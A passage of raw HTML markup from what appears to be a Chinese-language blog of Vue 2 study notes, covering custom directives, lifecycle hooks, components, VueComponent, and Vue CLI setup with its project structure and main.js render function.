class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//定义全局指令</span></span></span><br><span class="line"><span class="javascript">    Vue.directive(<span class="string">&#x27;fbind&#x27;</span>,&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//指令与元素成功绑定时（一上来）</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">bind</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line">            element.value = binding.value</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//指令所在元素被插入页面时</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">inserted</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line">            element.focus()</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//指令所在的模板被重新解析时</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">update</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line">            element.value = binding.value</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            n:1</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">// 局部</span></span></span><br><span class="line">        directives:&#123;</span><br><span class="line"><span class="javascript">            <span class="comment">//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 函数式</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">big</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;big&#x27;</span>,<span class="built_in">this</span>) <span class="comment">//注意此处的this是window（因为去操作了DOM元素）</span></span></span><br><span class="line">                element.innerText = binding.value * 10</span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="comment">// 对象式</span></span></span><br><span class="line">            fbind:&#123;</span><br><span class="line"><span class="javascript">                <span class="comment">//指令与元素成功绑定时（一上来）</span></span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">bind</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line">                    element.value = binding.value</span><br><span class="line">                &#125;,</span><br><span class="line"><span class="javascript">                <span class="comment">//指令所在元素被插入页面时</span></span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">inserted</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line">                    element.focus()</span><br><span class="line">                &#125;,</span><br><span class="line"><span class="javascript">                <span class="comment">//指令所在的模板被重新解析时</span></span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">update</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line">                    element.value = binding.value</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h1><h3 id="什么是生命周期？"><a href="#什么是生命周期？" class="headerlink" title="什么是生命周期？"></a>什么是生命周期？</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">生命周期：</span></span><br><span class="line"><span class="comment">1.又名：生命周期回调函数、生命周期函数、生命周期钩子。</span></span><br><span class="line"><span class="comment">2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。</span></span><br><span class="line"><span class="comment">3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。</span></span><br><span class="line"><span class="comment">4.生命周期函数中的this指向是vm 或 组件实例对象。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="生命周期原理图"><a href="#生命周期原理图" class="headerlink" title="生命周期原理图"></a>生命周期原理图</h3><p><img src="%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt=""></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">常用的生命周期钩子：</span></span><br><span class="line"><span class="comment">1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。</span></span><br><span class="line"><span class="comment">2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">关于销毁Vue实例</span></span><br><span class="line"><span class="comment">1.销毁后借助Vue开发者工具看不到任何信息。</span></span><br><span class="line"><span class="comment">2.销毁后自定义事件会失效，但原生DOM事件依然有效。</span></span><br><span class="line"><span class="comment">3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><h3 id="模块与组件，模块化与组件化"><a href="#模块与组件，模块化与组件化" class="headerlink" title="模块与组件，模块化与组件化"></a>模块与组件，模块化与组件化</h3><h5 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h5><ol><li>理解：向外提供特定功能的js程序，一般就是一个js文件</li><li>为什么：js文件很多很复杂</li><li>作用：复用js,简化js的编写，提高js运行效率</li></ol><h5 id="组件-1"><a href="#组件-1" class="headerlink" title="组件"></a>组件</h5><ol><li>理解：用来实现局部（特定）功能效果的代码集合(html/css/js/,image.)</li><li>为什么：一个界面的功能很复杂</li><li>作用：复用编码，简化项目编码，提高运行效率~</li></ol><h5 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h5><p>当应用中的js都以模块来编写的，那这个应用就是一个模块化的应用</p><h5 id="组件化"><a href="#组件化" class="headerlink" title="组件化"></a>组件化</h5><p>当应用中的功能都是多组件的方式来编写的，那这个应用就是一个组件化的应用</p><p><img src="image-20220421164206569.png" alt=""></p><p><img src="image-20220421164625111.png" alt=""></p><p><img src="image-20220421165523085.png" alt=""></p><h1 id="非单文件组件"><a href="#非单文件组件" class="headerlink" title="非单文件组件"></a>非单文件组件</h1><p>非单文件组件：一个.html文件包含多个组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">Vue中使用组件的三大步骤：</span></span><br><span class="line"><span class="comment">一、定义组件(创建组件)</span></span><br><span class="line"><span class="comment">二、注册组件</span></span><br><span class="line"><span class="comment">三、使用组件(写组件标签)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">一、如何定义一个组件？</span></span><br><span class="line"><span class="comment">使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；</span></span><br><span class="line"><span class="comment">区别如下：</span></span><br><span class="line"><span class="comment">1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。</span></span><br><span class="line"><span class="comment">2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系(一改数据，全部引用的数据全部会改变)。</span></span><br><span class="line"><span class="comment">备注：使用template可以配置组件结构。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">二、如何注册组件？</span></span><br><span class="line"><span class="comment">1.局部注册：靠new Vue的时候传入components选项</span></span><br><span class="line"><span class="comment">2.全局注册：靠Vue.component(&#x27;组件名&#x27;,组件)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">三、编写组件标签：</span></span><br><span class="line"><span class="comment">&lt;school&gt;&lt;/school&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 第三步：编写组件标签 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//第一步：创建school组件</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> school = Vue.extend(&#123;</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示学校名<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">`,</span><br><span class="line"><span class="javascript">        <span class="comment">// el:&#x27;#root&#x27;, //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;ccy&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;惠州&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="built_in">this</span>.schoolName)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line"><span class="javascript">    <span class="comment">// 第二步，全局注册组件</span></span></span><br><span class="line"><span class="javascript">    Vue.component(<span class="string">&quot;school&quot;</span>,school)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">//创建vm</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好啊！&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//第二步：局部注册组件</span></span></span><br><span class="line">        components:&#123;</span><br><span class="line">            school</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意点</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">几个注意点：</span></span><br><span class="line"><span class="comment">1.关于组件名:</span></span><br><span class="line"><span class="comment">一个单词组成：</span></span><br><span class="line"><span class="comment">第一种写法(首字母小写)：school</span></span><br><span class="line"><span class="comment">第二种写法(首字母大写)：School</span></span><br><span class="line"><span class="comment">多个单词组成：</span></span><br><span class="line"><span class="comment">第一种写法(kebab-case命名)：my-school</span></span><br><span class="line"><span class="comment">第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)</span></span><br><span class="line"><span class="comment">备注：</span></span><br><span class="line"><span class="comment">(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。</span></span><br><span class="line"><span class="comment">(2).可以使用name配置项指定组件在开发者工具中呈现的名字。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.关于组件标签:</span></span><br><span class="line"><span class="comment">第一种写法：&lt;school&gt;&lt;/school&gt;</span></span><br><span class="line"><span class="comment">第二种写法：&lt;school/&gt;</span></span><br><span class="line"><span class="comment">备注：不用使用脚手架时，&lt;school/&gt;会导致后续组件不能渲染。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3.一个简写方式：</span></span><br><span class="line"><span class="comment">const school = Vue.extend(options) 可简写为：const school = options</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Vue-Component"><a href="#Vue-Component" class="headerlink" title="Vue.Component"></a>Vue.Component</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">关于VueComponent：</span></span><br><span class="line"><span class="comment">1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。</span></span><br><span class="line"><span class="comment">2.我们只需要写&lt;school/&gt;或&lt;school&gt;&lt;/school&gt;，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4.关于this指向：</span></span><br><span class="line"><span class="comment">(1).组件配置中：</span></span><br><span class="line"><span class="comment">data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。</span></span><br><span class="line"><span class="comment">(2).new Vue(options)配置中：</span></span><br><span class="line"><span class="comment">data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。</span></span><br><span class="line"><span class="comment">Vue的实例对象，以后简称vm。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Vue和VueComponent的关系"><a href="#Vue和VueComponent的关系" class="headerlink" title="Vue和VueComponent的关系"></a>Vue和VueComponent的关系</h1><p><img src="image-20220423162454620.png" alt=""></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype</span></span><br><span class="line"><span class="comment">2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h1 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件"></a>单文件组件</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示学校名<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;School&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                name:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京昌平&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="built_in">this</span>.name)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.demo</span>&#123;</span></span><br><span class="line">        background-color: orange;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="脚手架"><a href="#脚手架" class="headerlink" title="脚手架"></a>脚手架</h1><h3 id="安装vue"><a href="#安装vue" class="headerlink" title="安装vue"></a>安装vue</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">加速下载</span><br><span class="line">npm config set registry heeps:&#x2F;&#x2F;registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line">安装全局vue</span><br><span class="line">npm install -g @vue&#x2F;cli</span><br></pre></td></tr></table></figure><p><strong>出现的问题</strong></p><p><img src="image-20220424104301407.png" alt=""></p><p><strong>产生错误的缘由：</strong></p><p>是电脑资源的问题，电脑里面没有配置淘宝镜像web</p><p><strong>解决步骤：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">配置淘宝镜像：npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org</span><br><span class="line">配置完镜像以后验证是否成功：npm config get registry</span><br></pre></td></tr></table></figure><p><img src="image-20220424104521185.png" alt=""></p><p><strong>重新执行安装语句</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g @vue&#x2F;cli</span><br></pre></td></tr></table></figure><p><img src="image-20220424104548005.png" alt=""></p><p><strong>下载成功，检查下载的版本</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue -V</span><br></pre></td></tr></table></figure><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">创建脚手架项目</span><br><span class="line">vue create 项目名</span><br></pre></td></tr></table></figure><p><img src="image-20220424105140599.png" alt=""></p><p>创建好了</p><p><img src="image-20220424105252470.png" alt=""></p><p>vue脚手架隐藏了所有webpack相关配置文件，查看可使用以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue inspect &gt; output.js</span><br></pre></td></tr></table></figure><h3 id="rander函数"><a href="#rander函数" class="headerlink" title="rander函数"></a>rander函数</h3><p>main.js文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 该文件是整个项目的入口文件 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//引入Vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">//引入App组件，它是所有组件的父组件</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="comment">//关闭vue的生产提示</span></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">关于不同版本的Vue：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1.vue.js与vue.runtime.xxx.js的区别：</span></span><br><span class="line"><span class="comment">(1).vue.js是完整版的Vue，包含：核心功能+模板解析器。</span></span><br><span class="line"><span class="comment">(2).vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用</span></span><br><span class="line"><span class="comment">render函数接收到的createElement函数去指定具体内容。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3.用脚手架创建vue项目，默认导入没有模板解析器的vue文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建Vue实例对象---vm</span></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    <span class="comment">//render函数完成了这个功能：将App组件放入容器中</span></span><br><span class="line">    render: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    rander(createElement)&#123;</span></span><br><span class="line"><span class="comment">   return createElement(&quot;h1&quot;,&quot;hello word!&quot;) </span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">简写：</span></span><br><span class="line"><span class="comment">rander: h =&gt; h(&quot;h1&quot;,&quot;hello word!&quot;)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//在没有模板解析器的情况下，rander替换了以下的template和components的写法</span></span><br><span class="line">    <span class="comment">// template:`&lt;h1&gt;你好啊&lt;/h1&gt;`,</span></span><br><span class="line">    <span class="comment">// components:&#123;App&#125;,</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="脚手架文件结构"><a href="#脚手架文件结构" class="headerlink" title="脚手架文件结构"></a>脚手架文件结构</h3><p><img src="image-20220424150523262.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">|-- node_modules:node依赖包</span><br><span class="line">|-- public</span><br><span class="line">||-- favieon.ico:页签图标</span><br><span class="line">||__ index.html:主页面</span><br><span class="line">|-- src</span><br><span class="line">||-- assets:存放静态资源</span><br><span class="line">|||__  logo.png</span><br><span class="line">||-- component:存放组件</span><br><span class="line">|||__ HelloWorld.vue</span><br><span class="line">||-- App.vue:汇总所有组件</span><br><span class="line">||-- main.js:入口文件</span><br><span class="line">|-- .gitignore:git版本管制忽咯的配置</span><br><span class="line">|-- babel.config.js:babel的配置文件,ES6语法&#x3D;&#x3D;&gt;ES5语法</span><br><span class="line">|-- package.json:应用包配置文件&#x2F;项目信息</span><br><span class="line">|-- README,md:应用描述文件</span><br><span class="line">|-- package-lock.json:包版本控制文件</span><br><span class="line">|-- vue.config.js:配置脚手架&#x2F;可有可无</span><br></pre></td></tr></table></figure><blockquote><p>vue.config.js文件</p></blockquote><p>使用vue inspect &gt;output.js 可以查看到vue脚手架的默认配置</p><p>使用vue.config.js 可以对脚手架进行个性化定制/配置</p><blockquote><p>index.html</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span 